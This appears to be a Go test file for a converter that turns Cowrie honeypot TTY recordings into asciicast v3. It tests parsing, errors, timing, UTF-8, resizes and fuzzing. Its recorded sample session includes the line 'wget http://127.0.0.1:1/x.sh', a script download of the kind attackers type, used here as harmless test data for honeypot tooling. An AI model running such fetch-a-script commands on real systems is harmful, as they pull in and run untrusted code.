package ttylog

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"io"
	"math"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/devleesch001/cauri/internal/asciicast"
)

// testdata/cowrie-v3.1.2.tty was written by the official cowrie/cowrie
// image (v3.1.2) during a scripted session: login, three commands, exit.
const realFile = "testdata/cowrie-v3.1.2.tty"

var t0 = time.Date(2026, 10, 14, 9, 0, 0, 0, time.UTC)

// rec encodes one record at t0 + offset.
func rec(op, dir int32, offset time.Duration, data string) []byte {
	at := t0.Add(offset)
	b := make([]byte, headerSize, headerSize+len(data))
	le := binary.LittleEndian
	le.PutUint32(b[0:], uint32(op))
	le.PutUint32(b[8:], uint32(len(data)))
	le.PutUint32(b[12:], uint32(dir))
	le.PutUint32(b[16:], uint32(at.Unix()))
	le.PutUint32(b[20:], uint32(at.Nanosecond()/1000))
	return append(b, data...)
}

func file(records ...[]byte) []byte { return bytes.Join(records, nil) }

type event struct {
	at   time.Duration // absolute, recomputed from the intervals
	code string
	data string
}

// convert runs Convert and decodes its v3 output.
func convert(t *testing.T, data []byte, opts Options) (map[string]any, []event, error) {
	t.Helper()
	var out bytes.Buffer
	err := Convert(bytes.NewReader(data), asciicast.NewV3(&out), opts)
	if out.Len() == 0 {
		return nil, nil, err
	}
	lines := strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n")
	var header map[string]any
	if jerr := json.Unmarshal([]byte(lines[0]), &header); jerr != nil {
		t.Fatalf("header %s: %v", lines[0], jerr)
	}
	var events []event
	var at float64
	for _, l := range lines[1:] {
		var e [3]any
		if jerr := json.Unmarshal([]byte(l), &e); jerr != nil {
			t.Fatalf("event %s: %v", l, jerr)
		}
		at += e[0].(float64)
		events = append(events, event{
			at:   time.Duration(math.Round(at*1e6)) * time.Microsecond,
			code: e[1].(string), data: e[2].(string),
		})
	}
	return header, events, err
}

func TestReaderRealRecording(t *testing.T) {
	f, err := os.Open(realFile)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	r := NewReader(f)
	ops := map[int32]int{}
	dirs := map[int32]int{}
	var input []string
	for {
		rec, err := r.Next()
		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			t.Fatal(err)
		}
		ops[rec.Op]++
		if rec.Op == OpWrite {
			dirs[rec.Dir]++
			if rec.Dir == DirInput {
				input = append(input, string(rec.Data))
			}
		}
	}
	if ops[OpOpen] != 1 || ops[OpWrite] != 93 || ops[OpClose] != 1 || dirs[DirOutput] != 89 || dirs[DirInput] != 4 {
		t.Errorf("ops %v, dirs %v", ops, dirs)
	}
	if got := strings.Join(input, ""); got != "uname -a\ncat /proc/cpuinfo | head -3\nwget http://127.0.0.1:1/x.sh\nexit\n" {
		t.Errorf("input = %q", got)
	}
}

func TestReaderErrors(t *testing.T) {
	good := rec(OpWrite, DirOutput, 0, "ok")
	negative := rec(OpWrite, DirOutput, 0, "")
	binary.LittleEndian.PutUint32(negative[8:], 0xffffffff)
	huge := rec(OpWrite, DirOutput, 0, "")
	binary.LittleEndian.PutUint32(huge[8:], MaxData+1)
	badUsec := rec(OpOpen, 0, 0, "")
	binary.LittleEndian.PutUint32(badUsec[20:], 1e6)

	for name, c := range map[string]struct {
		data []byte
		want error
	}{
		"truncated header": {good[:10], ErrTruncated},
		"truncated data":   {good[:len(good)-1], ErrTruncated},
		"negative length":  {negative, ErrCorrupt},
		"length too large": {huge, ErrCorrupt},
		"microseconds":     {badUsec, ErrCorrupt},
	} {
		_, err := NewReader(bytes.NewReader(c.data)).Next()
		if !errors.Is(err, c.want) {
			t.Errorf("%s: err = %v, want %v", name, err, c.want)
		}
	}
}

func TestConvertRealRecording(t *testing.T) {
	data, err := os.ReadFile(realFile)
	if err != nil {
		t.Fatal(err)
	}
	header, events, err := convert(t, data, Options{IdleTimeLimit: 2 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	term := header["term"].(map[string]any)
	if header["version"] != 3.0 || term["cols"] != 80.0 || term["rows"] != 24.0 || header["idle_time_limit"] != 2.0 {
		t.Errorf("header = %v", header)
	}
	counts := map[string]int{}
	var input, output strings.Builder
	for _, e := range events {
		counts[e.code]++
		if e.code == asciicast.Input {
			input.WriteString(e.data)
		} else {
			output.WriteString(e.data)
		}
	}
	if counts[asciicast.Input] != 4 || counts[asciicast.Output] != 89 {
		t.Errorf("events = %v", counts)
	}
	if !strings.Contains(input.String(), "wget http://127.0.0.1:1/x.sh") || !strings.Contains(output.String(), "Debian GNU/Linux") {
		t.Errorf("content lost: input %q", input.String())
	}
	// Real timing: the last write is 0.913 s after the start.
	if last := events[len(events)-1].at; last < 900*time.Millisecond || last > 920*time.Millisecond {
		t.Errorf("last event at %v", last)
	}
}

func TestConvertTiming(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, 10*time.Microsecond, "$ "),
		rec(OpWrite, DirInput, 61*time.Second, "x"), // a long pause, kept
		rec(OpWrite, DirOutput, 61*time.Second+3*time.Microsecond, "x"),
		rec(OpClose, 0, 62*time.Second, ""),
	)
	header, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := header["idle_time_limit"]; ok {
		t.Error("idle_time_limit written without being asked")
	}
	if header["timestamp"] != float64(t0.Unix()) {
		t.Errorf("timestamp = %v", header["timestamp"])
	}
	want := []event{
		{10 * time.Microsecond, "o", "$ "},
		{61 * time.Second, "i", "x"},
		{61*time.Second + 3*time.Microsecond, "o", "x"},
	}
	if len(events) != len(want) {
		t.Fatalf("events = %v", events)
	}
	for i := range want {
		if events[i] != want[i] {
			t.Errorf("event %d = %v, want %v", i, events[i], want[i])
		}
	}
}

func TestConvertUTF8(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Millisecond, "a\xc3"),        // é cut in two
		rec(OpWrite, DirOutput, 2*time.Millisecond, "\xa9b\xff"),  // its end, then an invalid byte
		rec(OpWrite, DirOutput, 3*time.Millisecond, "\xe2\x82"),   // € never completed
		rec(OpWrite, DirInput, 3*time.Millisecond, "p\xc3\xa0ss"), // input decoded on its own
	)
	_, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, e := range events {
		got = append(got, e.code+":"+e.data)
	}
	want := []string{"o:a", "o:éb\uFFFD", "i:pàss", "o:\uFFFD"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("events = %q, want %q", got, want)
	}
}

func TestConvertSizes(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Second, "a"),
		rec(OpWrite, DirOutput, 3*time.Second, "b"),
	)
	cases := map[string]struct {
		sizes      []TermSize
		header     string
		resizes    []string
		resizeTime time.Duration
	}{
		"none": {nil, "80x24", nil, 0},
		"before the start": {[]TermSize{
			{t0.Add(-time.Second), 100, 30},
			{t0.Add(-time.Millisecond), 120, 40},
		}, "120x40", nil, 0},
		"just after the start": {[]TermSize{{t0.Add(5 * time.Millisecond), 132, 43}}, "132x43", nil, 0},
		"resized during the session": {[]TermSize{
			{t0, 100, 30},
			{t0.Add(2 * time.Second), 150, 50},
			{t0.Add(time.Hour), 10, 10}, // after the end: dropped
		}, "100x30", []string{"150x50"}, 2 * time.Second},
		"implausible": {[]TermSize{{t0, 0, 24}, {t0, 100000, 24}}, "80x24", nil, 0},
	}
	for name, c := range cases {
		header, events, err := convert(t, data, Options{Sizes: c.sizes})
		if err != nil {
			t.Fatal(err)
		}
		term := header["term"].(map[string]any)
		if got := asciicast.ResizeData(int(term["cols"].(float64)), int(term["rows"].(float64))); got != c.header {
			t.Errorf("%s: header size %s, want %s", name, got, c.header)
		}
		var resizes []string
		for _, e := range events {
			if e.code == asciicast.Resize {
				resizes = append(resizes, e.data)
				if e.at != c.resizeTime {
					t.Errorf("%s: resize at %v, want %v", name, e.at, c.resizeTime)
				}
			}
		}
		if strings.Join(resizes, ",") != strings.Join(c.resizes, ",") {
			t.Errorf("%s: resizes %v, want %v", name, resizes, c.resizes)
		}
	}
}

// A damaged recording is replayed up to the damage.
func TestConvertDamaged(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Second, "kept"),
		rec(OpWrite, DirOutput, 2*time.Second, "lost")[:headerSize+2],
	)
	_, events, err := convert(t, data, Options{})
	if !errors.Is(err, ErrTruncated) {
		t.Errorf("err = %v, want ErrTruncated", err)
	}
	if len(events) != 1 || events[0].data != "kept" {
		t.Errorf("events = %v", events)
	}

	header, _, err := convert(t, nil, Options{})
	if err == nil || header != nil {
		t.Errorf("empty file: header %v, err %v", header, err)
	}
}

// The file comes from the honeypot: any content must give either valid
// asciicast or an error, never a panic or an invalid line.
func FuzzConvert(f *testing.F) {
	real, err := os.ReadFile(realFile)
	if err != nil {
		f.Fatal(err)
	}
	f.Add(real)
	f.Add(real[:100])
	f.Add(file(rec(OpOpen, 0, 0, ""), rec(OpWrite, DirOutput, time.Second, "\xff\xc3")))
	f.Fuzz(func(t *testing.T, data []byte) {
		var out bytes.Buffer
		_ = Convert(bytes.NewReader(data), asciicast.NewV3(&out), Options{})
		for _, line := range strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n") {
			if out.Len() > 0 && !json.Valid([]byte(line)) {
				t.Fatalf("invalid line %q", line)
			}
		}
	})
}

// Line ends of the output get the carriage return a real terminal adds;
// input is left as typed.
func TestConvertLineEnds(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Millisecond, "one\ntwo\r\n"),
		rec(OpWrite, DirInput, 2*time.Millisecond, "ls\n"),
	)
	_, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if events[0].data != "one\r\ntwo\r\r\n" || events[1].data != "ls\n" {
		t.Errorf("events = %+v", events)
	}
}
